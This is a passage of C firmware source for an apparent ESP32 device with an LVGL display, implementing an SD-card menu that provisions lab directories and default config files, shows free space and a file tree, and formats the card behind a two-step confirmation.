      "timestamp,gps_lat,gps_lon,arfcn,lac,cell_id,anomaly_type,rssi,details\n" },
    { SD_ITEM_FILE, "/sdcard/lab/cellular/raw_at.log",       "" },
    { SD_ITEM_FILE, "/sdcard/lab/alerts/proximity.csv",
      "timestamp,gps_lat,gps_lon,mac,label,rssi,alert_type\n" },
    { SD_ITEM_FILE, "/sdcard/lab/alerts/css_alerts.csv",
      "timestamp,gps_lat,gps_lon,arfcn,lac,cell_id,anomaly_type,rssi,details\n" },
    { SD_ITEM_FILE, "/sdcard/lab/config/lab5_override.cfg",
      "go_dark_on_boot=false\nvibrate_on_alert=true\nrssi_alert_threshold=-70\n"
      "pcap_enabled=false\ncss_detection_enabled=true\nwardrive_enabled=true\n"
      "screen_timeout_sec=60\nbrightness_pct=80\n" },
    { SD_ITEM_FILE, "/sdcard/lab/config/detection.cfg",
      "lac_change_alert=true\nneighbor_suppression_alert=true\nrssi_spike_threshold=20\n"
      "band_downgrade_alert=true\nunknown_tower_alert=true\n"
      "ble_unknown_device_alert=false\nwifi_unknown_oui_alert=false\n" },
    { SD_ITEM_FILE, "/sdcard/lab/bluetooth/lookout.csv",     BT_LOOKOUT_CSV_HEADER },
};
#define SD_ITEMS_COUNT  (sizeof(SD_ITEMS) / sizeof(SD_ITEMS[0]))

// ─── Async progress / completion callbacks (run in LVGL context) ─────────────

static void sd_prov_line_cb(void *arg)
{
    sd_prov_update_t *upd = (sd_prov_update_t *)arg;
    if (sd_provision_log_ta) {
        lv_textarea_add_text(sd_provision_log_ta, upd->line);
        lv_textarea_add_text(sd_provision_log_ta, "\n");
    }
    free(upd);
}

static void sd_prov_done_cb(void *arg)
{
    char *summary = (char *)arg;
    if (sd_provision_status_label) {
        lv_label_set_text(sd_provision_status_label, summary ? summary : "Done");
        lv_obj_set_style_text_color(sd_provision_status_label, COLOR_MATERIAL_GREEN, 0);
    }
    if (sd_prov_back_btn) {
        lv_obj_clear_state(sd_prov_back_btn, LV_STATE_DISABLED);
        lv_obj_set_style_bg_color(sd_prov_back_btn, COLOR_MATERIAL_TEAL, LV_STATE_DEFAULT);
    }
    free(summary);
    sd_provision_active = false;
    if (sd_provision_task_stack) {
        heap_caps_free(sd_provision_task_stack);
        sd_provision_task_stack = NULL;
    }
}

// ─── Provision background task ───────────────────────────────────────────────

#define PROV_POST(fmt, ...) do { \
    sd_prov_update_t *_u = malloc(sizeof(sd_prov_update_t)); \
    if (_u) { snprintf(_u->line, sizeof(_u->line), fmt, ##__VA_ARGS__); \
               lv_async_call(sd_prov_line_cb, _u); } \
} while (0)

// Helper: take sd_spi_mutex with 10s timeout; returns false and posts error on failure
#define PROV_TAKE_MUTEX() \
    (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(10000)) == pdTRUE)

static void sd_provision_task(void *pvParams)
{
    bool after_format = (bool)(uintptr_t)pvParams;
    int  created = 0, ok_count = 0;

    // Format must hold the mutex for its entire duration (many SPI transactions)
    if (after_format) {
        PROV_POST("Formatting SD card...");
        if (!PROV_TAKE_MUTEX()) {
            PROV_POST("ERR: mutex timeout during format");
            goto done;
        }
        esp_err_t fr = wifi_wardrive_format_sd();
        xSemaphoreGive(sd_spi_mutex);
        vTaskDelay(pdMS_TO_TICKS(100));  // let display refresh after long hold
        if (fr != ESP_OK) {
            PROV_POST("Format FAILED: %s", esp_err_to_name(fr));
            goto done;
        }
        PROV_POST("Remounting SD card...");
        // Format unmounted the card — remount before provisioning files
        if (!PROV_TAKE_MUTEX()) {
            PROV_POST("ERR: mutex timeout before remount");
            goto done;
        }
        esp_err_t mr = wifi_wardrive_init_sd();
        xSemaphoreGive(sd_spi_mutex);
        if (mr != ESP_OK) {
            PROV_POST("Remount FAILED: %s", esp_err_to_name(mr));
            goto done;
        }
        PROV_POST("Format OK — rebuilding structure...");
    }

    // Process each item with per-item mutex acquire/release so display stays live
    for (int i = 0; i < (int)SD_ITEMS_COUNT; i++) {
        const sd_provision_item_t *item = &SD_ITEMS[i];

        if (!PROV_TAKE_MUTEX()) {
            PROV_POST("ERR: mutex timeout at item %d", i);
            goto done;
        }

        struct stat st;
        bool exists = (stat(item->path, &st) == 0);

        if (item->type == SD_ITEM_DIR) {
            if (exists) {
                PROV_POST("  OK  %s/", item->path + 8);
                ok_count++;
            } else {
                if (mkdir(item->path, 0755) == 0) {
                    PROV_POST("  ++  %s/", item->path + 8);
                    created++;
                } else {
                    PROV_POST("  !!  %s/ (err %d)", item->path + 8, errno);
                }
            }
        } else {
            if (exists) {
                PROV_POST("  OK  %s", item->path + 8);
                ok_count++;
            } else {
                FILE *f = fopen(item->path, "w");
                if (f) {
                    if (item->content && item->content[0])
                        fwrite(item->content, 1, strlen(item->content), f);
                    fclose(f);
                    PROV_POST("  ++  %s", item->path + 8);
                    created++;
                } else {
                    PROV_POST("  !!  %s (errno %d)", item->path + 8, errno);
                }
            }
        }

        xSemaphoreGive(sd_spi_mutex);
        vTaskDelay(pdMS_TO_TICKS(30));  // yield — lets LVGL flush the new log line
    }

    // Append run summary to provision.log
    if (PROV_TAKE_MUTEX()) {
        FILE *log = fopen("/sdcard/lab/config/provision.log", "a");
        if (log) {
            fprintf(log, "Created: %d  OK: %d\n", created, ok_count);
            fclose(log);
        }
        xSemaphoreGive(sd_spi_mutex);
    }

done: ;
    char *summary = malloc(64);
    if (summary) snprintf(summary, 64, "Done — %d created, %d OK", created, ok_count);
    lv_async_call(sd_prov_done_cb, summary);
    vTaskDelete(NULL);
}

// ─── Provision running screen ─────────────────────────────────────────────────

static void sd_prov_back_btn_cb(lv_event_t *e)
{
    (void)e;
    show_sd_card_screen();
}

static void show_sd_provision_running_screen(bool after_format)
{
    sd_provision_active = true;
    const char *title = after_format ? "Format + Provision" : "Validate & Provision";
    create_function_page_base(title);

    // Log text area — scrollable, monospace-ish; shortened to leave room for bottom bar
    sd_provision_log_ta = lv_textarea_create(function_page);
    lv_obj_set_size(sd_provision_log_ta, lv_pct(100), LCD_V_RES - 30 - 44);
    lv_obj_align(sd_provision_log_ta, LV_ALIGN_TOP_MID, 0, 30);
    lv_textarea_set_max_length(sd_provision_log_ta, 4096);
    lv_textarea_set_one_line(sd_provision_log_ta, false);
    lv_obj_set_style_text_font(sd_provision_log_ta, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(sd_provision_log_ta, ui_text_color(), 0);
    lv_obj_set_style_bg_color(sd_provision_log_ta, lv_color_hex(0x0d1b2a), 0);
    lv_obj_set_style_border_width(sd_provision_log_ta, 1, 0);
    lv_obj_set_style_border_color(sd_provision_log_ta, ui_border_color(), 0);
    lv_obj_set_style_pad_all(sd_provision_log_ta, 4, 0);
    lv_obj_clear_flag(sd_provision_log_ta, LV_OBJ_FLAG_CLICKABLE);

    // Bottom bar: status label (left) + back button (right), flex row
    lv_obj_t *bottom_bar = lv_obj_create(function_page);
    lv_obj_set_size(bottom_bar, lv_pct(100), 38);
    lv_obj_align(bottom_bar, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(bottom_bar, ui_bg_color(), 0);
    lv_obj_set_style_border_width(bottom_bar, 0, 0);
    lv_obj_set_style_radius(bottom_bar, 0, 0);
    lv_obj_set_style_pad_hor(bottom_bar, 8, 0);
    lv_obj_set_style_pad_ver(bottom_bar, 4, 0);
    lv_obj_set_style_pad_column(bottom_bar, 6, 0);
    lv_obj_clear_flag(bottom_bar, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(bottom_bar, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(bottom_bar, LV_FLEX_ALIGN_SPACE_BETWEEN, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    // Status / summary label — grows to fill left side
    sd_provision_status_label = lv_label_create(bottom_bar);
    lv_label_set_text(sd_provision_status_label, "Running...");
    lv_obj_set_style_text_color(sd_provision_status_label, ui_muted_color(), 0);
    lv_obj_set_style_text_font(sd_provision_status_label, &lv_font_montserrat_14, 0);
    lv_label_set_long_mode(sd_provision_status_label, LV_LABEL_LONG_DOT);
    lv_obj_set_flex_grow(sd_provision_status_label, 1);

    // Back button — disabled until task completes
    sd_prov_back_btn = lv_btn_create(bottom_bar);
    lv_obj_set_size(sd_prov_back_btn, 60, 30);
    lv_obj_set_style_bg_color(sd_prov_back_btn, lv_color_hex(0x333333), LV_STATE_DEFAULT);
    lv_obj_set_style_border_width(sd_prov_back_btn, 0, 0);
    lv_obj_set_style_radius(sd_prov_back_btn, 8, 0);
    lv_obj_add_state(sd_prov_back_btn, LV_STATE_DISABLED);
    lv_obj_add_event_cb(sd_prov_back_btn, sd_prov_back_btn_cb, LV_EVENT_CLICKED, NULL);
    lv_obj_t *back_lbl = lv_label_create(sd_prov_back_btn);
    lv_label_set_text(back_lbl, "Back");
    lv_obj_set_style_text_color(back_lbl, ui_muted_color(), 0);
    lv_obj_center(back_lbl);

    // Launch background task in PSRAM stack
    sd_provision_task_stack = heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
    if (sd_provision_task_stack) {
        xTaskCreateStatic(sd_provision_task, "sd_prov", 4096,
                          (void *)(uintptr_t)after_format, 3,
                          sd_provision_task_stack, &sd_provision_task_buf);
    } else {
        lv_label_set_text(sd_provision_status_label, "ERR: no PSRAM for task");
        sd_provision_active = false;
        lv_obj_clear_state(sd_prov_back_btn, LV_STATE_DISABLED);
        lv_obj_set_style_bg_color(sd_prov_back_btn, COLOR_MATERIAL_TEAL, LV_STATE_DEFAULT);
    }
}

// ─── Validate & Provision confirm ────────────────────────────────────────────

static void sd_prov_confirm_yes_cb(lv_event_t *e)
{
    bool after_fmt = (bool)(uintptr_t)lv_event_get_user_data(e);
    show_sd_provision_running_screen(after_fmt);
}

static void sd_prov_confirm_no_cb(lv_event_t *e)
{
    (void)e;
    show_sd_card_screen();
}

static void show_sd_provision_confirm(bool after_format)
{
    create_function_page_base("Validate & Provision");

    lv_obj_t *msg = lv_label_create(function_page);
    lv_label_set_text(msg,
        "Create missing directories\nand config files?\n\n"
        "Existing files are never\noverwritten.");
    lv_obj_set_style_text_align(msg, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_set_style_text_color(msg, ui_text_color(), 0);
    lv_obj_set_style_text_font(msg, &lv_font_montserrat_16, 0);
    lv_obj_align(msg, LV_ALIGN_CENTER, 0, -20);

    lv_obj_t *btn_bar = lv_obj_create(function_page);
    lv_obj_set_size(btn_bar, lv_pct(100), 50);
    lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(btn_bar, ui_bg_color(), 0);
    lv_obj_set_style_border_width(btn_bar, 0, 0);
    lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_bar, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_gap(btn_bar, 12, 0);

    lv_obj_t *no_btn = lv_btn_create(btn_bar);
    lv_obj_set_size(no_btn, 90, 34);
    lv_obj_set_style_bg_color(no_btn, ui_panel_color(), LV_STATE_DEFAULT);
    lv_obj_set_style_border_width(no_btn, 1, 0);
    lv_obj_set_style_border_color(no_btn, ui_border_color(), 0);
    lv_obj_set_style_radius(no_btn, 8, 0);
    lv_obj_add_event_cb(no_btn, sd_prov_confirm_no_cb, LV_EVENT_CLICKED, NULL);
    lv_obj_t *no_lbl = lv_label_create(no_btn);
    lv_label_set_text(no_lbl, "NO");
    lv_obj_set_style_text_color(no_lbl, ui_text_color(), 0);
    lv_obj_center(no_lbl);

    lv_obj_t *yes_btn = lv_btn_create(btn_bar);
    lv_obj_set_size(yes_btn, 90, 34);
    lv_obj_set_style_bg_color(yes_btn, COLOR_MATERIAL_TEAL, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(yes_btn, lv_color_lighten(COLOR_MATERIAL_TEAL, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(yes_btn, 0, 0);
    lv_obj_set_style_radius(yes_btn, 8, 0);
    lv_obj_add_event_cb(yes_btn, sd_prov_confirm_yes_cb, LV_EVENT_CLICKED,
                        (void *)(uintptr_t)after_format);
    lv_obj_t *yes_lbl = lv_label_create(yes_btn);
    lv_label_set_text(yes_lbl, "YES");
    lv_obj_set_style_text_color(yes_lbl, ui_text_color(), 0);
    lv_obj_center(yes_lbl);
}

// ─── Shared back-to-menu callback (used by Free Space and Format screens) ────

static void sd_back_to_menu_cb(lv_event_t *e)
{
    (void)e;
    show_sd_card_screen();
}

// ─── Free Space screen ───────────────────────────────────────────────────────

static void show_sd_free_space_screen(void)
{
    create_function_page_base("SD Free Space");

    bool ok = false;
    uint64_t total_b = 0, free_b = 0, used_b = 0;
    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(3000)) == pdTRUE) {
        FATFS *fs_p;
        DWORD fre_clust;
        FRESULT res = f_getfree("0:", &fre_clust, &fs_p);
        if (res == FR_OK) {
            uint64_t clust_sz = (uint64_t)fs_p->csize * 512ULL;
            uint64_t total_clust = (uint64_t)(fs_p->n_fatent - 2);
            total_b = total_clust * clust_sz;
            free_b  = (uint64_t)fre_clust * clust_sz;
            used_b  = total_b - free_b;
            ok = true;
        } else {
            ESP_LOGE(TAG, "[FREE_SPACE] f_getfree failed: %d", (int)res);
        }
        xSemaphoreGive(sd_spi_mutex);
    }

    lv_obj_t *card = lv_obj_create(function_page);
    lv_obj_set_size(card, 200, 160);
    lv_obj_align(card, LV_ALIGN_CENTER, 0, -10);
    lv_obj_set_style_bg_color(card, ui_panel_color(), 0);
    lv_obj_set_style_border_width(card, 1, 0);
    lv_obj_set_style_border_color(card, ui_border_color(), 0);
    lv_obj_set_style_radius(card, 10, 0);
    lv_obj_set_style_pad_all(card, 10, 0);
    lv_obj_clear_flag(card, LV_OBJ_FLAG_SCROLLABLE);

    if (!ok) {
        lv_obj_t *err = lv_label_create(card);
        lv_label_set_text(err, "SD not available");
        lv_obj_set_style_text_color(err, COLOR_MATERIAL_RED, 0);
        lv_obj_center(err);
    } else {
        uint32_t total_mb = (uint32_t)(total_b / (1024ULL * 1024ULL));
        uint32_t free_mb  = (uint32_t)(free_b  / (1024ULL * 1024ULL));
        uint32_t used_mb  = (uint32_t)(used_b  / (1024ULL * 1024ULL));
        bool low = free_mb < 50;

        lv_obj_t *lbl_total = lv_label_create(card);
        char buf[48];
        snprintf(buf, sizeof(buf), "Total:  %lu MB", (unsigned long)total_mb);
        lv_label_set_text(lbl_total, buf);
        lv_obj_set_style_text_font(lbl_total, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(lbl_total, ui_text_color(), 0);
        lv_obj_align(lbl_total, LV_ALIGN_TOP_LEFT, 0, 0);

        lv_obj_t *lbl_used = lv_label_create(card);
        snprintf(buf, sizeof(buf), "Used:   %lu MB", (unsigned long)used_mb);
        lv_label_set_text(lbl_used, buf);
        lv_obj_set_style_text_font(lbl_used, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(lbl_used, ui_text_color(), 0);
        lv_obj_align(lbl_used, LV_ALIGN_TOP_LEFT, 0, 22);

        lv_obj_t *lbl_free = lv_label_create(card);
        snprintf(buf, sizeof(buf), "Free:   %lu MB", (unsigned long)free_mb);
        lv_label_set_text(lbl_free, buf);
        lv_obj_set_style_text_font(lbl_free, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(lbl_free, low ? COLOR_MATERIAL_RED : COLOR_MATERIAL_GREEN, 0);
        lv_obj_align(lbl_free, LV_ALIGN_TOP_LEFT, 0, 44);

        if (low) {
            lv_obj_t *warn = lv_label_create(card);
            lv_label_set_text(warn, LV_SYMBOL_WARNING " Low space!");
            lv_obj_set_style_text_color(warn, COLOR_MATERIAL_RED, 0);
            lv_obj_set_style_text_font(warn, &lv_font_montserrat_14, 0);
            lv_obj_align(warn, LV_ALIGN_TOP_LEFT, 0, 66);
        }

        // Bar indicator
        int pct_used = (total_mb > 0) ? (int)((used_mb * 100) / total_mb) : 0;
        lv_obj_t *bar_bg = lv_obj_create(card);
        lv_obj_set_size(bar_bg, 170, 14);
        lv_obj_align(bar_bg, LV_ALIGN_BOTTOM_MID, 0, 0);
        lv_obj_set_style_bg_color(bar_bg, lv_color_hex(0x333333), 0);
        lv_obj_set_style_border_width(bar_bg, 0, 0);
        lv_obj_set_style_radius(bar_bg, 4, 0);
        lv_obj_clear_flag(bar_bg, LV_OBJ_FLAG_SCROLLABLE);

        lv_obj_t *bar_fill = lv_obj_create(bar_bg);
        int fill_w = (170 * pct_used) / 100;
        if (fill_w < 2) fill_w = 2;
        lv_obj_set_size(bar_fill, fill_w, 14);
        lv_obj_align(bar_fill, LV_ALIGN_LEFT_MID, 0, 0);
        lv_obj_set_style_bg_color(bar_fill, low ? COLOR_MATERIAL_RED : COLOR_MATERIAL_TEAL, 0);
        lv_obj_set_style_border_width(bar_fill, 0, 0);
        lv_obj_set_style_radius(bar_fill, 4, 0);
        lv_obj_clear_flag(bar_fill, LV_OBJ_FLAG_SCROLLABLE);
    }

    lv_obj_t *back_btn = lv_btn_create(function_page);
    lv_obj_set_size(back_btn, 90, 34);
    lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(back_btn, COLOR_MATERIAL_TEAL, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(back_btn, lv_color_lighten(COLOR_MATERIAL_TEAL, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(back_btn, 0, 0);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_add_event_cb(back_btn, sd_back_to_menu_cb, LV_EVENT_CLICKED, NULL);
    lv_obj_t *back_lbl = lv_label_create(back_btn);
    lv_label_set_text(back_lbl, "Back");
    lv_obj_set_style_text_color(back_lbl, ui_text_color(), 0);
    lv_obj_center(back_lbl);
}

// ─── File Tree screen ────────────────────────────────────────────────────────

static void sd_tree_walk(char *buf, size_t bufsz, const char *path, int depth, size_t *pos)
{
    if (depth > 8) return;
    DIR *dir = opendir(path);
    if (!dir) return;
    struct dirent *entry;
    char child[300];
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] == '.') continue;
        if (*pos + 128 >= bufsz) {
            if (bufsz - *pos > 20)
                *pos += snprintf(buf + *pos, bufsz - *pos, "...(truncated)\n");
            break;
        }
        snprintf(child, sizeof(child), "%s/%s", path, entry->d_name);
        struct stat st;
        bool have_stat = (stat(child, &st) == 0);
        bool is_dir    = have_stat && S_ISDIR(st.st_mode);

        for (int i = 0; i < depth * 2 && *pos + 1 < bufsz; i++)
            buf[(*pos)++] = ' ';

        if (is_dir) {
            *pos += snprintf(buf + *pos, bufsz - *pos, "%s/\n", entry->d_name);
            sd_tree_walk(buf, bufsz, child, depth + 1, pos);
        } else {
            if (have_stat) {
                uint32_t sz = (uint32_t)st.st_size;
                char sz_str[12];
                if (sz >= 1024 * 1024)
                    snprintf(sz_str, sizeof(sz_str), "%luM", (unsigned long)(sz / (1024 * 1024)));
                else if (sz >= 1024)
                    snprintf(sz_str, sizeof(sz_str), "%luK", (unsigned long)(sz / 1024));
                else
                    snprintf(sz_str, sizeof(sz_str), "%luB", (unsigned long)sz);
                *pos += snprintf(buf + *pos, bufsz - *pos, "%s [%s]\n", entry->d_name, sz_str);
            } else {
                *pos += snprintf(buf + *pos, bufsz - *pos, "%s\n", entry->d_name);
            }
        }
    }
    closedir(dir);
}

static void show_sd_tree_screen(void)
{
    create_function_page_base("SD File Tree");

    const size_t bufsz = 16 * 1024;
    char *tree_buf = heap_caps_malloc(bufsz, MALLOC_CAP_SPIRAM);
    if (!tree_buf) tree_buf = malloc(4096);

    if (!tree_buf) {
        lv_obj_t *err = lv_label_create(function_page);
        lv_label_set_text(err, "Out of memory");
        lv_obj_set_style_text_color(err, COLOR_MATERIAL_RED, 0);
        lv_obj_align(err, LV_ALIGN_CENTER, 0, 0);
    } else {
        size_t pos = 0;
        tree_buf[0] = '\0';

        if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(3000)) == pdTRUE) {
            sd_tree_walk(tree_buf, bufsz, "/sdcard", 0, &pos);
            xSemaphoreGive(sd_spi_mutex);
        } else {
            pos += snprintf(tree_buf, bufsz, "SD not available");
        }
        if (pos == 0) pos += snprintf(tree_buf, bufsz, "(empty)");
        tree_buf[pos < bufsz ? pos : bufsz - 1] = '\0';

        lv_obj_t *scroll_cont = lv_obj_create(function_page);
        lv_obj_set_size(scroll_cont, lv_pct(100), LCD_V_RES - 35 - 43);
        lv_obj_align(scroll_cont, LV_ALIGN_TOP_MID, 0, 35);
        lv_obj_set_style_bg_color(scroll_cont, ui_bg_color(), 0);
        lv_obj_set_style_border_color(scroll_cont, ui_border_color(), 0);
        lv_obj_set_style_border_width(scroll_cont, 1, 0);
        lv_obj_set_style_radius(scroll_cont, 6, 0);
        lv_obj_set_style_pad_all(scroll_cont, 6, 0);

        lv_obj_t *tree_label = lv_label_create(scroll_cont);
        lv_label_set_long_mode(tree_label, LV_LABEL_LONG_WRAP);
        lv_obj_set_width(tree_label, lv_pct(100));
        lv_obj_set_style_text_font(tree_label, &lv_font_montserrat_12, 0);
        lv_obj_set_style_text_color(tree_label, ui_text_color(), 0);
        lv_label_set_text(tree_label, tree_buf);
        free(tree_buf);
    }

    lv_obj_t *back_btn = lv_btn_create(function_page);
    lv_obj_set_size(back_btn, 110, 28);
    lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(back_btn, COLOR_MATERIAL_TEAL, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(back_btn, lv_color_lighten(COLOR_MATERIAL_TEAL, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(back_btn, 0, 0);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_set_style_shadow_width(back_btn, 4, 0);
    lv_obj_set_style_shadow_color(back_btn, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_shadow_opa(back_btn, LV_OPA_40, 0);
    lv_obj_set_style_pad_ver(back_btn, 4, 0);
    lv_obj_set_style_pad_hor(back_btn, 8, 0);
    lv_obj_set_style_pad_column(back_btn, 4, 0);
    lv_obj_set_flex_flow(back_btn, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(back_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_font(back_icon, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(back_icon, ui_text_color(), 0);

    lv_obj_t *back_text = lv_label_create(back_btn);
    lv_label_set_text(back_text, "Back");
    lv_obj_set_style_text_font(back_text, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(back_text, ui_text_color(), 0);

    lv_obj_add_event_cb(back_btn, sd_back_to_menu_cb, LV_EVENT_CLICKED, NULL);
}

// ─── Format — two-stage confirmation ─────────────────────────────────────────

static void sd_format_confirm2_yes_cb(lv_event_t *e)
{
    (void)e;
    show_sd_provision_running_screen(true);
}

static void show_sd_format_confirm2(void)
{
    create_function_page_base("Format SD Card");

    lv_obj_t *msg = lv_label_create(function_page);
    lv_label_set_text(msg,
        LV_SYMBOL_WARNING " Are you really sure?\n\n"
        "Because you are not\ngetting your stuff back!");
    lv_obj_set_style_text_align(msg, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_set_style_text_color(msg, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_text_font(msg, &lv_font_montserrat_16, 0);
    lv_obj_align(msg, LV_ALIGN_CENTER, 0, -20);

    lv_obj_t *btn_bar = lv_obj_create(function_page);
    lv_obj_set_size(btn_bar, lv_pct(100), 50);
    lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(btn_bar, ui_bg_color(), 0);
    lv_obj_set_style_border_width(btn_bar, 0, 0);
    lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_bar, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_gap(btn_bar, 12, 0);

    lv_obj_t *no_btn = lv_btn_create(btn_bar);
    lv_obj_set_size(no_btn, 90, 34);
    lv_obj_set_style_bg_color(no_btn, ui_panel_color(), LV_STATE_DEFAULT);
    lv_obj_set_style_border_width(no_btn, 1, 0);
    lv_obj_set_style_border_color(no_btn, ui_border_color(), 0);
    lv_obj_set_style_radius(no_btn, 8, 0);
    lv_obj_add_event_cb(no_btn, sd_back_to_menu_cb, LV_EVENT_CLICKED, NULL);
    lv_obj_t *no_lbl = lv_label_create(no_btn);
    lv_label_set_text(no_lbl, "NO");
    lv_obj_set_style_text_color(no_lbl, ui_text_color(), 0);
    lv_obj_center(no_lbl);

    lv_obj_t *yes_btn = lv_btn_create(btn_bar);
    lv_obj_set_size(yes_btn, 90, 34);
    lv_obj_set_style_bg_color(yes_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(yes_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(yes_btn, 0, 0);
    lv_obj_set_style_radius(yes_btn, 8, 0);
    lv_obj_add_event_cb(yes_btn, sd_format_confirm2_yes_cb, LV_EVENT_CLICKED, NULL);
    lv_obj_t *yes_lbl = lv_label_create(yes_btn);
    lv_label_set_text(yes_lbl, "FORMAT");
    lv_obj_set_style_text_color(yes_lbl, ui_text_color(), 0);
    lv_obj_center(yes_lbl);
}

static void sd_format_confirm1_yes_cb(lv_event_t *e)
{
    (void)e;
    show_sd_format_confirm2();
}

static void show_sd_format_confirm1(void)
{
    create_function_page_base("Format SD Card");

    lv_obj_t *msg = lv_label_create(function_page);
    lv_label_set_text(msg, "Format SD Card?\n\nAll data will be erased.\nThis cannot be undone.");
    lv_obj_set_style_text_align(msg, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_set_style_text_color(msg, ui_text_color(), 0);
    lv_obj_set_style_text_font(msg, &lv_font_montserrat_16, 0);
    lv_obj_align(msg, LV_ALIGN_CENTER, 0, -20);

    lv_obj_t *btn_bar = lv_obj_create(function_page);
    lv_obj_set_size(btn_bar, lv_pct(100), 50);
    lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(btn_bar, ui_bg_color(), 0);
    lv_obj_set_style_border_width(btn_bar, 0, 0);
    lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_bar, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_gap(btn_bar, 12, 0);

    lv_obj_t *no_btn = lv_btn_create(btn_bar);
    lv_obj_set_size(no_btn, 90, 34);
    lv_obj_set_style_bg_color(no_btn, ui_panel_color(), LV_STATE_DEFAULT);
    lv_obj_set_style_border_width(no_btn, 1, 0);
    lv_obj_set_style_border_color(no_btn, ui_border_color(), 0);
    lv_obj_set_style_radius(no_btn, 8, 0);
    lv_obj_add_event_cb(no_btn, sd_back_to_menu_cb, LV_EVENT_CLICKED, NULL);
    lv_obj_t *no_lbl = lv_label_create(no_btn);
    lv_label_set_text(no_lbl, "NO");
    lv_obj_set_style_text_color(no_lbl, ui_text_color(), 0);
    lv_obj_center(no_lbl);

    lv_obj_t *yes_btn = lv_btn_create(btn_bar);
    lv_obj_set_size(yes_btn, 90, 34);
    lv_obj_set_style_bg_color(yes_btn, COLOR_MATERIAL_AMBER, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(yes_btn, lv_color_lighten(COLOR_MATERIAL_AMBER, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(yes_btn, 0, 0);
    lv_obj_set_style_radius(yes_btn, 8, 0);
    lv_obj_add_event_cb(yes_btn, sd_format_confirm1_yes_cb, LV_EVENT_CLICKED, NULL);
    lv_obj_t *yes_lbl = lv_label_create(yes_btn);
    lv_label_set_text(yes_lbl, "YES");
    lv_obj_set_style_text_color(yes_lbl, ui_text_color(), 0);
    lv_obj_center(yes_lbl);
}

// ─── SD Card sub-menu ────────────────────────────────────────────────────────

static void sd_card_tile_event_cb(lv_event_t *e)
{
    const char *name = (const char *)lv_event_get_user_data(e);
    if (!name) return;
    if      (strcmp(name, "Validate") == 0)   show_sd_provision_confirm(false);
    else if (strcmp(name, "Free Space") == 0) show_sd_free_space_screen();
    else if (strcmp(name, "Tree") == 0)       show_sd_tree_screen();
    else if (strcmp(name, "Format") == 0)     show_sd_format_confirm1();
}

static void show_sd_card_screen(void)
{
    create_function_page_base("SD Card");

    lv_obj_t *tiles = lv_obj_create(function_page);
    lv_obj_set_size(tiles, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(tiles, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(tiles, ui_bg_color(), 0);
    lv_obj_set_style_border_width(tiles, 0, 0);
    lv_obj_set_style_pad_all(tiles, 10, 0);
    lv_obj_set_style_pad_gap(tiles, 10, 0);
